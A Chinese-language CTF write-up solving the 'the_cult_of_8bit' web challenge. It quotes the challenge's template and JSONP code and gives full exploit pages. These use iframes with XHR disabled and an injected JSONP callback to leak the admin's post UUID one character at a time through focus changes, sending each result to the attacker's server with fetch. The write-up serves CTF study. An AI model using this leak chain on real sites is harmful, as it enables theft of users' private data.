# Web
## the_cult_of_8bit
注册登录之后发现有简历post和to do的功能
最初的想法是去骗取_csrf的值来实现登录admin，但是发现每次都会刷新

![](attachments/Pasted%20image%2020230408131159.png)

大致的解法就是搞到bot放flag的post的uuid，但是需要先通过xss来偷取bot的admin账户，这里想要骗点击的话，就只有自己上传的post和to do

这是home.ejs部分的关键代码

```js
<div class="container has-text-centered">
      <div class="column is-8 is-offset-2">
        <%_ if (user) { _%>
        <div class="box">
          <div class="nes-container with-title is-centered my-4">
            <p class="title">8-bit Cult</p>
            <p class="is-size-4 has-text-left">Welcome, <%= user.user %>!</p>
            <p class="is-size-5 has-text-weight-bold has-text-left">Your posts:</p>
            <div class="content">
              <ul>
              <%_ user.posts.forEach(post => { _%>
                <li class="has-text-left"><a href="/post/?id=<%= post %>"><%= post %></a></li>
              <%_ }); _%>
              </ul>
            </div>
            <p class="is-size-5 has-text-weight-bold has-text-left">Your todo list:</p>
            <div class="content">
              <ul>
              <%_ user.todos.forEach(todo => { _%>
                <%_ if (todo.isURL) { _%>
                  <li class="has-text-left"><a target="_blank" href=<%= todo.text %>><%= todo.text %></a></li>
                <%_ } else { _%>
                <li class="has-text-left"><%= todo.text %></li>
                <%_ } _%>
              <%_ }); _%>
              </ul>
            </div>
          </div>
        </div>
```

能够看出，在todo这里有一个isURL的check大致是，如果todo是url的话就给放到`<a>`里面，这样操作的话bot就可以点击到
这里的isURL有对应的check会去去除空格和对`jacascript:`的检测

![](attachments/Pasted%20image%2020230408141012.png)

在post.ejs中存在callback

```js
      function load_post(post) {
        if (!post.success) {
          $("#post-name").innerText = "Error";
          $("#post-body").innerText = post.error;
          return;
        }
  
        $("#post-name").innerText = post.name;
        $("#post-body").innerText = post.body;
      }

      window.onload = function() {
        const id = new URLSearchParams(window.location.search).get('id');
        if (!id) {
          return;
        }
  
        // Load post from POST_SERVER
        // Since POST_SERVER might be a different origin, this also supports loading data through JSONP
        const request = new XMLHttpRequest();
        try {
          request.open('GET', POST_SERVER + `/api/post/` + encodeURIComponent(id), false);
          request.send(null);
        }
        catch (err) { // POST_SERVER is on another origin, so let's use JSONP
          let script = document.createElement("script");
          script.src = `${POST_SERVER}/api/post/${id}?callback=load_post`;
          document.head.appendChild(script);
          return;
        }
  
        load_post(JSON.parse(request.responseText));
      }
    </script>
```

首先确定获得admin页面的uuid的位置，这个可以用自己创建的做实验

![](attachments/Pasted%20image%2020230408172455.png)

现在知道了对应uuid的位置，可以通过类似sql盲注的方式来实现获取uuid
之后为了使用josnnp来完成跨域访问，需要设置ifarems的allow属性 sync-xhr 'none'来禁用xhr使try捕获异常，从而使用jsonp来获取数据

![](attachments/Pasted%20image%2020230409154316.png)

```js
router.get("/post/:id", (req, res) => {
    let { id } = req.params;
  
    if (!id || typeof id !== "string") {
        return res.jsonp({
            success: false,
            error: "Missing id"
        });
    }
  
    if (!db.posts.has(id)) {
        return res.jsonp({
            success: false,
            error: "No post found with that id"
        });
    }
  
    let post = db.posts.get(id);
    return res.jsonp({
        success: true,
        name: post.name,
        body: post.body
    });
});
```


使用callback需要将原来的callback=load_post截断掉，这里使用#

url=>  `http://localhost:12345/post/?id=ad2a46df-4b36-470a-aa39-79acec6ca801?callback=function#`

### exp
index.html
```js
<script>
    const host = "http://localhost:12345"
    window.open("./exp.html","_blank")
    location.replace(host)
</script>
```

exp.html

```js
<a id="default" href="#">default</a>
<script>
    async function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    const selfId = "ad2a46df-4b36-470a-aa39-79acec6ca801";//自己给个存在的post id
    const host = "http://localhost:12345";//题目地址
    const charList = "0123456789abcdef-";
    var resId = "";
  
    function createCharIframe(name) {
        var tmpIframe = document.createElement('iframe');
        tmpIframe.name = name;
        document.body.appendChild(tmpIframe);
    }
    charList.split('').forEach(name => createCharIframe(name));
  
    (function createChallengeIframe() {
        var challengeIframe = document.createElement('iframe');
        challengeIframe.name = "challenge";
        challengeIframe.src = host;
        challengeIframe.allow = "sync-xhr 'none'";//使用特征策略禁止xhr
        document.body.appendChild(challengeIframe);
    })();
  
    async function exploit() {
  
        var challenge = window['challenge'];
        for(let i = 0; i < 36; i++) {
            //payload
            let payload = `top[top.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].text[${i}]].focus`;
            challenge.location = `${host}/pot/?id=${selfId}%3Fcallback=${payload}%23`;

            await sleep(200);//时间根据情况调整
        }
    }
  
    //监听焦点变化
    function listenFocus() {
  
        var activeFocusName = document.activeElement.name;
        if(activeFocusName) {//若监听到iframe焦点
            resId += activeFocusName;
            document.getElementById("default").focus();//初始化焦点
            fetch(`/res/${resId}`);
        }
    }
    setInterval(listenFocus, 100);
    sleep(2000);
    exploit();
</script>
```



## 参考文章
https://blog.huli.tw/2022/04/07/iframe-and-window-open/

https://mp.weixin.qq.com/s/RZSNb2tdvp5Q2Y41b9LXvw?ref=www.ctfiot.com

https://blog.maple3142.net/2023/01/08/real-world-ctf-2023-writeups/#the-cult-of-8-bit